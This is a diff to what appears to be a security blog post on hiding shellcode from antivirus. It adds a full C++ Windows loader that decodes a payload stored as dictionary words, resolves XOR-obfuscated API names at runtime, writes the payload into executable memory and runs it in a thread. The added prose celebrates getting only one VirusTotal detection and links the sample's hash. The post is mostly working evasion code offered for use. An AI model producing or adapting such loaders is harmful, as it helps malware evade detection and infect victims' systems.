@@ -67,12 +67,26 @@ print('char* payload_words[] {"' + '", "'.join(payload_words) + '"};')
 {% endhighlight %}
 
 <br>
-Similarly, in C++, we decode the payload.
+Similarly, in C++, we decode the payload. Below will be the full code.
 
 {% highlight cpp %}
-char* payload_words[] {...}
+#include <windows.h>
+
+typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE hHandle, DWORD dwMilliseconds);
+
+const char* payload_words[] = {"protend", "matador", "pathophobia", "pseudarthrosis", "pseudarthrosis", "pseudarthrosis", "inornate", "allophylic", "nondiffractive", "sashay", "buttonbur", "forecastleman", "pectoralgia", "indicter", "ancistroid", "pectoralgia", "indicter", "intemperably", "pectoralgia", "indicter", "kokan", "allophylic", 
+"archapostate", "keraunophone", "urao", "viviparism", "adenophyma", "pectoralgia", 
+"ptilinum", "malacology", "allophylic", "graticule", "balsamine", "notommatid", "careworn", "overliberally", "restrictionary", "plasticine", "theopsychism", "thumbbird", "vesiculotympanic", "uninchoative", "shopful", "hexanchus", "secluded", "skirwhit", "stomachfulness", "indicter", "pectoralgia", "indicter", "golaseccan", "temanite", "pectoralgia", "probroadcasting", "notommatid", "shopful", "unroaming", "pectoralgia", "urobenzoic", "oversoft", "punishability", "graticule", "tertiary", "leucocytoplania", "shopful", "unroaming", "pectoralgia", "protominobacter", "theopsychism", "shopful", "urotoxicity", "chaperon", "pectoralgia", "subauditur", "mushheaded", "punishability", "pseudotubercular", "tertiary", "notommatid", "allophylic", "archapostate", "secluded", "pectoralgia", "germanizer", "pectoralgia", "shopful", "macrame", "allophylic", "graticule", "thumbbird", "vesiculotympanic", "uninchoative", 
+"balsamine", "shopful", "hexanchus", "agnoiology", "assortive", "skirwhit", "coindication", "puistie", "nonexcavation", "unstickingness", "metapepsis", "nonexcavation", "omnivoracity", "skirwhit", "assortive", "protominobacter", "pectoralgia", "protominobacter", "omnivoracity", "shopful", "urotoxicity", "figurism", "pectoralgia", 
+"intemperably", "commerce", "pectoralgia", "protominobacter", "magnetometry", "shopful", "urotoxicity", "pectoralgia", "daywrit", "pectoralgia", "shopful", "unroaming", "sashay", "directed", "omnivoracity", "omnivoracity", "inhumate", "inhumate", "careworn", "synteresis", "incommutability", "proximally", "archapostate", "assortive", "protominobacter", "hrothgar", "incommutability", "pectoralgia", "unrecaptured", "courteous", "megaluridae", "archapostate", "archapostate", "archapostate", "unbasket", "reshovel", "oafishness", "saccharomycetic", "pseudarthrosis", "pseudarthrosis", "reshovel", "sendal", "daimio", "saccharomycetic", "hrothgar", "demargarinate", "reshovel", "leucocytoplania", "sendal", "adenophyma", "neurographic", "sashay", "matador", "archapostate", "unroaming", "caudation", "liguliflorous", "shopful", "pseudarthrosis", "pseudarthrosis", "unpoliteness", "placodont", "demargarinate", "chaperon", "reshovel", "unpoliteness", "megaluridae", "albocinereous", "pseudarthrosis", "archapostate", "irritancy", "gnosiological", "ptolemy", "reshovel", "ptolemy", 
+"pseudarthrosis", "pseudarthrosis", "megaluridae", "reshovel", "restrictionary", "pseudarthrosis", "shopful", "gyve", "sashay", "sledger", "chaperon", "chaperon", "chaperon", "chaperon", "urobenzoic", "chaperon", "urobenzoic", "chaperon", "reshovel", "homochromatism", "keraunophone", "resinosis", "assortive", "archapostate", "irritancy", "disputatively", "gnosiological", "golaseccan", "constitutionality", "temanite", "reshovel", "cyclobutane", "pseudoprofessional", "tertiary", "careworn", "archapostate", "irritancy", "punishability", "graticule", "tertiary", "ptolemy", "archapostate", "imprescriptible", "cephalagra", "skirwhit", "ampulla", "matador", "morphiomaniac", "pseudarthrosis", "pseudarthrosis", "pseudarthrosis", "gnosiological", 
+"pseudarthrosis", "gnosiological", "daywrit", "constitutionality", "temanite", "reshovel", "restrictionary", "unheroize", "pustulation", "hrothgar", "archapostate", "irritancy", "anthropomancy", "unstickingness", "pseudarthrosis", "woodworm", "spirochete", "pectoralgia", "spirochete", "gnosiological", "urobenzoic", "reshovel", "pseudarthrosis", "golaseccan", "pseudarthrosis", "pseudarthrosis", "constitutionality", "gnosiological", "pseudarthrosis", "reshovel", "protominobacter", "repetticoat", "dermatoconiosis", "buttonbur", "archapostate", "irritancy", "trichy", "dermatoconiosis", "gnosiological", "pseudarthrosis", "constitutionality", "dermatoconiosis", 
+"temanite", "reshovel", "restrictionary", "unheroize", "pustulation", "hrothgar", "archapostate", "irritancy", "anthropomancy", "unstickingness", "pseudarthrosis", "nonexcavation", "malacology", "protominobacter", "reshovel", "pseudarthrosis", "urobenzoic", "pseudarthrosis", "pseudarthrosis", "gnosiological", "pseudarthrosis", "chaperon", "reshovel", "hypoglycemia", "usent", "keraunophone", "ancistroid", "archapostate", "irritancy", "temanite", "reshovel", "skirwhit", "actiniomorpha", "bivalved", "careworn", "archapostate", "irritancy", "scandalmonger", "scandalmonger", "archapostate", "intemperably", "omnivoracity", "keraunophone", "punishability", "pagina", "archapostate", "archapostate", "archapostate", "courteous", "prison", "archapostate", "archapostate", "archapostate", "shopful", "baptistic", "unpoliteness", "aporphine", "skirwhit", "thumbbird", "baptistic", "gyve", "chamaesiphon", "mythopoetic", "imprecision", "constitutionality", "gnosiological", "pseudarthrosis", "dermatoconiosis", "archapostate", "irritancy"};
+
 int SHELLCODE_LENGTH = sizeof(payload_words) / 4;
-char payload[254];
+char payload[354];
 
 void decode_payload() {
     for (int i {0}; i < SHELLCODE_LENGTH; i++) {
@@ -86,4 +100,57 @@ void decode_payload() {
         payload[i] = value;
     }
 }
+
+
+HMODULE load_module(char* string, int size) {
+    for (int i {0}; i < size - 1; i ++) {
+        string[i] = string[i] ^ 0x27;
+        HMODULE handle = LoadLibraryA(string);
+        if (handle) {
+            return handle;
+        }
+    }
+    return 0;
+}
+
+DWORD load_api(HMODULE dll, char* string, int size) {
+    for (int i {0}; i < size - 1; i ++) {
+        string[i] = string[i] ^ 0x27;
+        DWORD address = (DWORD) GetProcAddress(dll, string);
+        if (address) {
+            return address;
+        }
+    }
+    return 0;
+}
+
+int main() {
+    char kernel32_str[] {"\x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b"};
+    char virtual_alloc_str[] {"\x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44"};
+    char create_thread_str[] {"\x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43"};
+    char wait_for_single_obj_str[] {"\x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53"};
+
+    decode_payload();
+
+    HMODULE kernel32 = load_module(kernel32_str, sizeof(kernel32_str));
+    VirtualAllocPtr virtual_alloc = (VirtualAllocPtr) load_api(kernel32, virtual_alloc_str, sizeof(virtual_alloc_str));
+    CreateThreadPtr create_thread = (CreateThreadPtr) load_api(kernel32, create_thread_str, sizeof(create_thread_str));
+    WaitForSingleObjectPtr wait_for_single_obj = (WaitForSingleObjectPtr) load_api(kernel32, wait_for_single_obj_str, sizeof(wait_for_single_obj_str));
+    
+    LPVOID memory = virtual_alloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    memcpy(memory, payload, sizeof(payload));
+
+    HANDLE hThread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
+    wait_for_single_obj(hThread, INFINITE);
+    
+    return 0;
+}
 {% endhighlight %}
+
+<br>
+Only 1 detection on VirusTotal! But by a Machine Learning engine... There's no rulebook to bypassing AI. This will be tough.
+
+SHA256: [6ec9895e2e01df36dc4f68b32690bce567beeba2da11c550c13262ef45555611](https://www.virustotal.com/gui/file/6ec9895e2e01df36dc4f68b32690bce567beeba2da11c550c13262ef45555611)
+
+![vt_english](/assets/post_assets/embedded-shellcode-obfuscation/vt_english.png)
